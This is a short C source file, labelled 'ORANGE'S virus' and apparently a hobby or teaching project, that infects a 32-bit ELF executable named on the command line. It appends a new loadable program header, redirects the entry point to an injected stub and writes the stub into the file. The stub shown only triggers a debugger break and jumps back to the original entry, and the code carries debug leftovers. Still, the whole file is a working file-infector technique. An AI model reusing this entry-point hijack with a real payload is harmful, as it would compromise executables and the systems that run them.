// ORANGE'S virus

#include "stdio.h"
#include "string.h"
#include "elf.h"

#define PAGE_SIZE 0x1000
#define breakpoint printf("--bp--\n")

char shellcode[8] = {
  0x66, 0x87, 0xdb, // xchg bx, bx, "magic break"
  0xe9, 0x00, 0x00, 0x00, 0x00 // jmp near e_entry_old
};
#define JMP_VAL_OFF (4)
#define NEXT_INSTR_OFF (3 + 5)

void info_phdr(Elf32_Phdr phdr){
  printf(
    "  rva = 0x%x\n"
    "  fov = 0x%x\n"
    "  fsz = 0x%x\n"
    "  msz = 0x%x\n",
    phdr.p_vaddr,
    phdr.p_offset,
    phdr.p_filesz,
    phdr.p_memsz
  );
}

void info_ehdr(Elf32_Ehdr ehdr){
  printf(
    "ehdr:\n"
    "  entry = 0x%x\n"
    "  phnum = 0x%x\n"
    "  phoff = 0x%x\n"
    "  phentsize = 0x%x\n",
    ehdr.e_entry,
    ehdr.e_phnum,
    ehdr.e_phoff,
    ehdr.e_phentsize
  );
}

void is_elf(Elf32_Ehdr ehdr){
  if(memcmp(ehdr.e_ident, ELFMAG, 4) != 0){
    printf("Not an ELF file");
    exit(0);
  }
}

void infect_elf(char* name){
  // declarations:
  Elf32_Ehdr ehdr;
  Elf32_Phdr phdr[4]; // FIXME
  Elf32_Phdr new_phdr;


  printf("Start infecing...\n");


  // open target
  int target_fd = open(name, O_RDWR);


  // get the ELF Header
  breakpoint;
  read(target_fd, &ehdr, sizeof(ehdr));
  breakpoint;

  // judge whether it is an elf-format file
  is_elf(ehdr);

  
  // deal with the Elf header
  printf("Start parsing...\n");
  Elf32_Addr e_entry_old = ehdr.e_entry;
  Elf32_Half e_phnum_old = ehdr.e_phnum;
  Elf32_Off e_phoff = ehdr.e_phoff;
  Elf32_Half e_phentsize = ehdr.e_phentsize;


  int last_loadable_seg_index = 0;


  // print information
  // XXX remove printf below after debug
  info_ehdr(ehdr);
  for(int i = 0; i < e_phnum_old; i++){
    int phdr_fov = e_phoff + i * e_phentsize;
    lseek(target_fd, phdr_fov, SEEK_SET);
    read(target_fd, phdr + i, e_phentsize);

    printf("num: %d\n", i);
    info_phdr(phdr[i]);
    if(phdr[i].p_type == PT_LOAD){
      last_loadable_seg_index = i;
    }
  }
  
  printf("Start adjusting...\n");
  
  // edit new program header
  new_phdr.p_type = PT_LOAD;
  new_phdr.p_offset = phdr[last_loadable_seg_index].p_offset + phdr[last_loadable_seg_index].p_filesz;
  new_phdr.p_vaddr = phdr[last_loadable_seg_index].p_vaddr + phdr[last_loadable_seg_index].p_memsz;
  new_phdr.p_paddr = 0; // not used
  new_phdr.p_filesz = sizeof(shellcode);
  new_phdr.p_memsz = new_phdr.p_filesz; // suppose they are the same
  new_phdr.p_flags = 0; // not used
  new_phdr.p_align = 0; // not used

  
  // edit shellcode
  Elf32_Addr e_entry_new = new_phdr.p_vaddr;
  unsigned int jmp_val = e_entry_old - NEXT_INSTR_OFF - e_entry_new;
  memcpy(shellcode + JMP_VAL_OFF, &jmp_val, sizeof(jmp_val));


  // edit ELF header
  ehdr.e_entry = e_entry_new;
  ehdr.e_phnum ++;
  

  // print the new headers
  printf("new_phdr\n");
  info_phdr(new_phdr);
  info_ehdr(ehdr);

  // // XXX debugging. delete this later
  
  // for(int i = 0; i < sizeof(shellcode); i++){
  //   printf("%#x ", shellcode[i]);
  // }

  printf("\njmp_val=%x", jmp_val);

  printf("Start injection...\n");
  lseek(target_fd, 0, SEEK_SET);
  write(target_fd, &ehdr, sizeof(ehdr));

  lseek(
    target_fd, 
    e_phoff + e_phnum_old * e_phentsize,
    SEEK_SET
  );
  write(target_fd, &new_phdr, e_phentsize);

  lseek(target_fd, new_phdr.p_offset, SEEK_SET);
  write(target_fd, &shellcode, new_phdr.p_filesz);
}

int main(int argc, char**argv){
  if(argc != 2){
    printf("usage: infect <file name>\n");
    exit(0);
  }
  infect_elf(argv[1]);
  return 0;
}